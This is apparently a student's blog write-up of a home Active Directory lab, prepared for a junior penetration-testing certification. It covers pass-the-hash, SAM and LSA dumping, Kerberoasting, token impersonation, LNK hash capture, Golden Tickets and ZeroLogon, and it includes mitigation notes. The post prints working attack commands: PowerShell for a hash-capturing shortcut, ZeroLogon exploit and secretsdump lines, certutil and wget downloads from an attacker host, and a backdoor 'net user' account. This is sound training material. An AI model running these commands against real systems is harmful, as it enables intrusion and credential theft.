---
layout: post
title: TCM - Active Directory Lab Building (Vol2)
subtitle: Preparing for PJPT (Practical Junior Penetration Tester) certification by walking through active directory lab build (Vol2)
tags: [ethical hacking, tcm, pjpt, active directory, windows, lab building]
comments: true
author: Lantana Park
---

# Active directory 2

## Attacking Active Directory: Post-Compromise Attacks

- Pass Attacks

1. Have access via password

CrackMapExec is a post-exploitation tool that helps automate assessing the security of AD network.

I used CrackMapExec to gather essential SMB information.

![stolen1](../assets/img/AD2/Screenshot%202024-07-22%20at%2010.29.24.png)

`SMB 192.168.64.33 445 THEPUNISHER [*] Windows 11 Build 22621 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:FALSE) (SMBv1:False)`

`Windows 11 Build 22621 x64` is the operating system information for the target machines being used.

`name:THEPUNISHER` is hostname
`domain:MARVEL.local` is domain name

`SMB 192.168.64.34 445 SPIDERMAN [+] MARVEL.local\fcastle (Pwn3d!)` and `SMB 192.168.64.33 445 THEPUNISHER [+] MARVEL.local\fcastle (Pwn3d!)` indicate that privileged access was obtained.

`SMB 192.168.64.32 445 HYDRA-DC [+] MARVEL.local\fcastle` says that Successful authentication to `HYDRA-DC` with the same credentials, but no privileged access indicated.

The term `Pwn3d!` in the output implies that the account `fcastle` has administrative or privileged access on `THEPUNISHER` and `SPIDERMAN`, but not necessarily on `HYDRA-DC`. This might be because `fcastle` has local administrator rights on these machines(`THEPUNISHER` and `SPIDERMAN`), not Domain Admin and Enterprise Admin rights.

At the moment, I have the access of local admins of the two machines - `THEPUNISHER` and `SPIDERMAN`.

2. Have access via `NTLM` hashes

![stolenViaHashes1](../assets/img/AD2/Screenshot%202024-07-22%20at%2012.03.23.png)

![stolenViaHashes2](../assets/img/AD2/Screenshot%202024-07-22%20at%2012.00.21.png)

`--local-auth` option indicates that the tool - `CrackMapExec` should perform local authentication. This means it will try to authenticate against the local account database on each target machine, rather than using domain-based authentication.

![stolenViaHashes3](../assets/img/AD2/Screenshot%202024-07-22%20at%2012.04.50.png)

![stolenViaHashes4](../assets/img/AD2/Screenshot%202024-07-22%20at%2012.05.03.png)

### What is the Security Accounts Manager (SAM)?

SAM is a database file in the Microsoft Windows operating system that contains usernames and passwords. The credentials are encrypted. The SAM database file is stored within `C:\Windows\System32\config`. The access is restricted.

`--sam` option tells `crackmapexec` to attempt to dump the Security Account Manager (SAM) database from the target machines, after a successful authentication.

![stolenViaHashes5](../assets/img/AD2/Screenshot%202024-07-22%20at%2012.05.18.png)

`--shares` makes `crackmapexec` to enumerate shared resources (shares) on the target machines after successful authentication.

This is not I am connecting with these shares. Just for enumerating.

`ADMIN$`, `C$`, and `IPC$` are shared in both machines

`ADMIN$` allows remote management and administrative access to the machine. It provides access to the Windows directory on the system(C:\Windows), enabling system administrators to perform tasks remotely.

`C$` provides access to the entire C: drive and is used for broader file management tasks.

`IPC$` is not used for file sharing. Instead, it is utilized for communication between networked processes.

![stolenViaHashes5](../assets/img/AD2/Screenshot%202024-07-22%20at%2013.23.00.png)

![stolenViaHashes6](../assets/img/AD2/Screenshot%202024-07-22%20at%2013.20.49.png)

`--lsa` specifies that the LSA secrets should be dumped. LSA secrets include sensitive data such as passwords and encryption keys stored by the LSA service.

LSA is a component of the Windows security subsystem. It provides various security services and manages **the local security policy**. It is a part of the LSASS process.

In the result, SMB service was detected.

I can learn that local admin in `SPIDERMAN` and `THEPUNISHER` have same password according to the hashes. And then it is possible to crack the password using `hashcat` or `John the Ripper`.

`aes256-cts-hmac-sha1-96` indicates the encryption algorithms and mode.

`0d4394f7ec3f961f4cc5b81ec667168921c6e5400b490f491d1d0a5d10b18435` was an encryption key used in the SMB protocol.

Finally, in the process of obtaining LSASSY credential, I was really confused. Because my attacks were detected by Windows firewalls and anti-virus program in the target machines. So I could proceed the attack by passing authentication from local users. Instead I did approach the DC machine directly using DC admin hashes. I got the DC admin hash by using `impacket-secretsdump`

I used `netexec` tool in this lsassy dumping.

LSASS is a Windows process responsible for enforcing the security policy on the system. It handles user logins, password changes, access tokens, and more.

The LSASS process is `lsass.exe` and typically runs with high privileges. It is a critical system process for maintaining the security and integrity of the Windows operating system.

![lsassyDumping](../assets/img/AD2/Screenshot%202024-07-24%20at%2021.17.38.png)

If I append `--local-auth` flag, it will allow me to attack by using local admin hashes.

With this `lsassy` credentials, I can get a shell of a target machine as blow.

![GotAShell](../assets/img/AD2/Screenshot%202024-07-25%20at%2010.33.23.png)

`cmedb` allows me to interact with the CME database, displaying information about hosts and credentials collected during my network scanning and penetration testing activities.

![stolenViaHashes11](../assets/img/AD2/Screenshot%202024-07-22%20at%2012.06.09.png)

![stolenViaHashes12](../assets/img/AD2/Screenshot%202024-07-22%20at%2012.06.18.png)

`hosts` is to list all the hosts recorded in the database.

`creds` is to list all the credentials.

- Pass Attacks - Crack the password

Since I have collected some valuable information, what if I crack that dumped hashes?

Firstly, I attempted to dump out the hashes of the machines (including DC and locals).

![dumpedHashes1](../assets/img/AD2/Screenshot%202024-07-25%20at%2010.49.43.png)

![dumpedHashes2](../assets/img/AD2/Screenshot%202024-07-25%20at%2010.50.09.png)

![dumpedHashes3](../assets/img/AD2/Screenshot%202024-07-25%20at%2011.28.58.png)

![dumpedHashes4](../assets/img/AD2/Screenshot%202024-07-25%20at%2010.50.26.png)

![dumpedHashes5](../assets/img/AD2/Screenshot%202024-07-25%20at%2010.51.29.png)

![dumpedHashes6](../assets/img/AD2/Screenshot%202024-07-25%20at%2010.51.39.png)

![dumpedHashes7](../assets/img/AD2/Screenshot%202024-07-25%20at%2010.53.54.png)

![dumpedHashes8](../assets/img/AD2/Screenshot%202024-07-25%20at%2011.01.25.png)

![dumpedHashes9](../assets/img/AD2/Screenshot%202024-07-25%20at%2011.02.04.png)

![dumpedHashes10](../assets/img/AD2/Screenshot%202024-07-25%20at%2011.03.05.png)

![dumpedHashes11](../assets/img/AD2/Screenshot%202024-07-25%20at%2011.01.42.png)

![dumpedHashes12](../assets/img/AD2/Screenshot%202024-07-25%20at%2011.01.51.png)

![dumpedHashes13](../assets/img/AD2/Screenshot%202024-07-25%20at%2011.32.48.png)

- Pass Attacks - Mitigation

In short, it is hard to completely prevent this attack, but we can make it more difficult on an attacker:

To begin with, firewalls and antivirus programs are really important because they can detect almost any attack. This will make it more cumbersome for attackers to bypass these detections.

Secondly, we should use string password and avoid of re-using password in local machine and DC machine.

Finally, it will be great to implement privilege access management because this solution can enhance security by automatically rotating passwords during check-in and check-out, reducing the risk of authorized access.

- Kerberoasing attack

It is a common and effective method for obtaining domain admin access within a network.

When I log on with a username and password, I got authenticated and receive a Ticket-Granting Ticket (TGT) from the Kerberos Key Distribution Center (KDC).

When I attempt to access any resource, I request a service ticket from the KDC. Once authorized, I receive a service ticket for that particular resource access.

Kerberoasting exploits the way Kerberos tickets(service tickets) are requested and handled. Attackers can extract the service ticket and decrypt the server's account hashes, which can then be used to escalate privileges and gain domain admin access.

In short, I need to capture the service tickets that are encrypted with the password hash of the service account.

I am going to use `GetUserSPN` tool to get the hash dumping.

Before I do this attack, there are two things to be prepared.

1. SPN should be set on the SQL service account.

### What is SPN?

It is a unique identifier and allows clients to request service tickets for specific services. In order to success this attack, the SQL service account should be associated with the SPN. The reason behind is that the SPN enables the Kerberos system to issue service tickets for those services, which can then be captured and analyzed to extract and potentially crack passwords.

![setSPN1](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.20.58.png)

![setSPN2](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.21.11.png)

![setSPN3](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.22.10.png)

![setSPN4](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.22.21.png)

2. This account should have admin privilege.

![setPrivilege1](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.33.41.png)

Ready to set!

3. Just make a SPN request to the DC machine.

![makeRequest](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.22.38.png)

Copy and past the hashes

![copyHashes1](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.41.19.png)

![copyHashes2](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.41.35.png)

And visit hashcat wiki to identify the number

![identifyHashes](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.25.01.png)

And then Crack it

![crackPassword1](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.43.12.png)

![crackPassword2](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.43.21.png)

![crackPassword3](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.43.30.png)

![crackPassword4](../assets/img/AD2/Screenshot%202024-07-25%20at%2013.43.02.png)

- Kerberoasting attack - Mitigation

Have strong and complex passwords.

Avoid storing passwords in descriptions or other easily accessible fields.

Do not grant unnecessary high-level privileges to the service accounts.

Implement additional measures like restricting SPNs, rotating passwords, and monitoring accounts for suspicious activities.

- Token Impersonation

This attack starts with the question. What if a Domain admin token was available?

Once the attacker has the Domain(DC) Admin token, they can use it to impersonate the Domain Admin. This involves injecting the token into their session or creating a new session with the stolen token.

Let's knock out this token impersonation attack!

1. Start the `matesploit`, set the options and create a session

![startMetasploi1](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.47.15.png)

![startMetasploit2](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.47.28.png)

![startMetasploit3](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.47.42.png)

![startMetasploit4](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.48.13.png)

![startMetasploit5](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.48.39.png)

![startMetasploit6](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.48.57.png)

![startMetasploit7](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.49.15.png)

![startMetasploit8](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.49.32.png)

2. Load the incognito module

The reason why I need to use incognito module is that this module makes impersonation attack and subsequent privilege escalation much more possible and easy.

Once I load the incognito module, it adds several commands to my meterpreter session that are not available by default.

![loadIncognito1](../assets/img/AD2/Screenshot%202024-07-25%20at%2019.24.33.png)

![loadIncognito2](../assets/img/AD2/Screenshot%202024-07-25%20at%2019.24.55.png)

3. List Available Tokens

This command lists all the available tokens under the current user context.

![delegationToken](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.52.21.png)

4. Impersonate a token

I attempts to impersonate the user `MARVEL\fcastle`

![impersonation1](../assets/img/AD2/Screenshot%202024-07-25%20at%2019.29.37.png)

Verified impersonation

![impersonation2](../assets/img/AD2/Screenshot%202024-07-25%20at%2019.29.57.png)

5. Revert to self and impersonate a higher Privilege Token

![reverting1](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.51.44.png)

This command reverts the session back to the original user context

![reverting2](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.52.21.png)

![reverting3](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.52.36.png)

6. Verifying higher privileged impersonation and add a new user to the Domain Controller

![addingNewUser](../assets/img/AD2/Screenshot%202024-07-25%20at%2019.35.46.png)

I could notice that `hawkeye` was added.

![verification1](../assets/img/AD2/Screenshot%202024-07-25%20at%2019.35.56.png)

![verification2](../assets/img/AD2/Screenshot%202024-07-25%20at%2019.36.07.png)

![verification3](../assets/img/AD2/Screenshot%202024-07-25%20at%2018.30.53.png)

- Token Impersonation - Mitigation

Assign users and service accounts only the minimum permissions they need to perform their job functions. Avoid granting unnecessary administrative privileges that could be abused for token manipulation.

Users should not have administrative rights on their local machines unless absolutely necessary.

- LNK file attacks

### What are the LNK files?

They provide a quick way to access files, folders, application, or network locations without navigating through the entire file system.

This file contains metadata such as target path, working directory, icon location, description, hostkey, window style.

There are different types of attacks that leverage the LNK files.

First of all, attackers can create LNK files that execute malicious scripts or commands when it opened.

Second of all, LNK files can point to remote resources, prompting the system to authenticate and potentially exposing credentials to attackers.

I am going to go for the second way of abusing LNK files.

1. Create the shell object in powershell

```powershell
$objShell = New-Object -ComObject WScript.shell
# This line creates a new shell object
$lnk = $objShell.CreateShortcut("C:\test.lnk")
# This line creates a new shortcut file named `test.lnk` in the `C:\` directory.
$lnk.TargetPath = "\\192.168.64.37\@test.png"
# This line specifies the location that the shortcut points to. This png file is pointing to attack machine
$lnk.WindowStyle = 1
# This line sets the window should appear when the shortcut is activated. `1` value means that window should be opened normally.
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
# This line specifies the icon that should be used for the shortcut.
$lnk.Description = "Test"
# This line provides a textual description of the shortcut. This description appears when the user hovers over the shortcut.
$lnk.HotKey = "Ctrl+Alt+T"
# This line sets a keyboard shortcut for the LNK file. `Ctrl+Alt+T` will activate the shortcut.
$lnk.Save()
# This line saves the configured shortcut.
```

On the PUNISHER machine, I created a shortcut file using powershell.

![createdFile](../assets/img/AD2/Screenshot%202024-07-26%20at%2018.11.52.png)

![savedFile](../assets/img/AD2/Screenshot%202024-07-26%20at%2018.57.04.png)

And then copied and pasted this `test` file into `\\HYDRA-DC\hackme`

![movedFile](../assets/img/AD2/Screenshot%202024-07-26%20at%2018.44.08.png)

Ready to capture the password hash using `responder`.

`responder -I eth0 -dp`

![responder1](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.25.47.png)

![responder2](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.25.53.png)

![responder3](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.26.08.png)

Make an event by refreshing.

![tryHashDumping](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.32.50.png)

![hashdumped](../assets/img/AD2/Screenshot%202024-07-26%20at%2019.29.38.png)

- Credential dumping with `Mimikatz`

`Mimikatz` is a tool to view and steal credentials, generate Kerberos tickets, and leverage attacks.

To proceed with this attack, I logged in `peterparker` user in SPIDERMAN machine.

1. Download the mimikats-related files.

## After compromising the domain controller/admin?

If I compromise the domain controller on day one, I need to put on blinders and go do it again. I have to go back and try to find other vulnerabilities that are out there in other paths to the domain admin.

During this time, I am going to dump the `NTDS.dit` and crack passwords.

- Dumping the `NTDS.dit`

### What is `NTDS.dit`?

This is a database used to stored AD data. This data includes, user information, group information, security description, and password hashes.

dumping the NTLM hashes

Since I have created this account `hawkeye:Password1@`, I use it because it is stored in the DC local accounts.

![ntlmHashes1](../assets/img/AD2/Screenshot%202024-08-01%20at%2010.06.18.png)

Prepared a file to crack these hashes

![ntlmHashes2](../assets/img/AD2/Screenshot%202024-08-01%20at%2010.24.23.png)

![ntlmHashes3](../assets/img/AD2/Screenshot%202024-08-01%20at%2010.24.00.png)

![ntlmHashes4](../assets/img/AD2/Screenshot%202024-08-01%20at%2010.24.16.png)

![ntlmHashes5](../assets/img/AD2/Screenshot%202024-08-01%20at%2010.23.52.png)

- Golden Ticket Attacks

It is to compromising the krbtgt account for owning the domain.

### What is `krbtgt` account?

It is automatically created when a Microsoft Active Directory Domain is created. When users logs in a Windows domain, they obtain TGT(Ticket Grant Ticket) which is signed with a key derived from the password of the `krbtgt`. The account's main function(`krbtgt` account) is to provide the secret key used to encrypt and sign all Kerberos tickets within the domain.

A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the `NTLM` hash of the `krbtgt` account password in a Microsoft Active Directory environment. With a Golden Ticket, an attacker can impersonate any user, including domain administrators, and gain unrestricted access to the domain.

Golden tickets == complete access to every machine.

Using the previously cracked password, I am going to create a golden ticket.

Run the `metasploit`

![metasplotPsexec1](../assets/img/AD2/Screenshot%202024-08-01%20at%2012.12.42.png)

Load the `kiwi`. Kiwi is an implementation of `Mimikatz` integrated into the Metasploit Framework. It allows penetration testers to use `Mimikatz` capabilities directly from the Metasploit environment without needing to run `Mimikatz` separately.

![metasploitPsexec2](../assets/img/AD2/Screenshot%202024-08-01%20at%2012.13.55.png)

![metasploitPsexec3](../assets/img/AD2/Screenshot%202024-08-01%20at%2012.14.37.png)

![kiwiCommand1](../assets/img/AD2/Screenshot%202024-08-01%20at%2016.39.48.png)

![kiwiCommand2](../assets/img/AD2/Screenshot%202024-08-01%20at%2016.38.03.png)

Create the golden ticket.

Let's save `SID` and `NTLM` hashes of `krbtgt`.

![gettingInfo1](../assets/img/AD2/Screenshot%202024-08-01%20at%2011.31.37.png)

![gettingInfo2](../assets/img/AD2/Screenshot%202024-08-01%20at%2012.10.51.png)

![metasploitPsexec4](../assets/img/AD2/Screenshot%202024-08-01%20at%2012.12.01.png)

![metasploitPsexec5](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.10.05.png)

![metasploitPsexec6](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.03.png)

![metasploitPsexec7](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.10.png)

![metasploitPsexec8](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.20.png)

![metasploitPsexec9](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.31.png)

![metasploitPsexec10](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.53.png)

![metasploitPsexec11](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.45.png)

With this golden ticket, I can revise domain users' password or set up backdoor.

## Additional Active Directory Attacks

Active Directory vulnerabilities occur all the time. Recent major vulnerabilities include zeroLogon, PrintNightmare, sam the admin.

It is worth checking for these additional vulnerabilities, **but I should not attempt to exploit them unless my client approves**. I need to get approvals before attempting these exploitations.

- ZeroLogon

It is a really critical bug. This attack allows the dc admin account password to be reset. As a result of this attack, attackers can obtain the `NTDS.DIT` dumping without knowing the password of the Domain Controller (DC).

https://github.com/SecuraBV/CVE-2020-1472 - for checking if the target machine is vulnerable to this attack

https://github.com/dirkjanm/CVE-2020-1472 - for exploitation and restoration of the password

As this attack is extremely dangerous, I need to consider the potential impact on the network if a DC server goes down, what the consequences would be if clients are unable to restore the DC to a working state, and finally, whether demonstrating the exploit is worth the risk.

1. `git clone https://github.com/dirkjanm/CVE-2020-1472.git`
   `git clone https://github.com/SecuraBV/CVE-2020-1472.git`

   It will be great to save the folder in `/opt`.

2. Run `python3 zerologon_tester.py HYDRA-DC 192.168.64.32`

   If DC can be compromised by a zerologon attack through this checking.

   Then exploit.

3. `python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.64.32`

4. `impacket-secretsdump -just-dc MARVEL/HYDRA-DC\$@192.168.64.32`

   Hashes will be dumped.

   Restore this server!

5. `impacket-secretsdump administrator@192.168.64.32 -hashes $(dumped hashes)`

   The hash formate will be like `a:a`.

   And then copy the `$(plain_password_hex)`

6. `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.64.32 -hexpass $(plain_password_hex)`

   This command is to restore the password.

   - PrintNightmare

   This vulnerability does not require authentication to exploit. It takes advantage of the print spooler service. It allows users to add printers and perform other actions, running with system privileges.

   https://github.com/cube0x0/CVE-2021-1675

## Attacking Active Directory: Post Exploitation

1. File Transfer

   For windows:

   To download a file from a server, use the following command:

   `certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt`

   Here, `http://10.10.10.10` is the address of the server from which the file needs to be downloaded.

   For linux:

   To start a simple HTTP server using Python on port 80, use:

   `python -m http.server 80`

   This command allows for easy file transfer over HTTP.

   To download files, use either:

   `wget http://10.10.10.10/file.txt`
   `curl http://10.10.10.10/file.txt`

   To start an FTP server using Python's `pyftpdlib` module on port 21, use:

   `python -m pyftpdlib 21`

   This server can be used to transfer files to and from an attacker machine or any other system.

   To connect to the FTP server running on 10.10.10.10, use:

   `ftp 10.10.10.10`

   IT uses the FTP client to connect to ftp server running on `10.10.10.10`

   For Browser,

   I can navigate directly to file. Like `http://10.10.10.10/file.txt` can be used.

2. Maintaining access

   To maintain persistent access even if the user's computer is shut down, it is likely to lose the shell. One of great way to make persistent access is to add a user. Although adding a new user can be noticeable, it is a safe way to maintain access.

   For example,

   `net user hacker password123 /add`

   Using persistence scripts with Metasploit can be dangerous because it essentially leaves an open port for you to connect to, which might be easily detected.

3. Pivoting

   In post-exploitation, pivoting is a technique used to extend access from a compromised machine (the initial foothold) to other machines or networks that are not directly accessible from the attacker's original entry point.

   `proxychain`, `sshuttle`, and `chisel` can be used.

4. Cleaning up

   I have to make the system/network as it was when I entered it.

   - Remove executables, scripts, and added files

   - Remove malware, rootkits, and added user accounts

   - Set settings back to original configurations
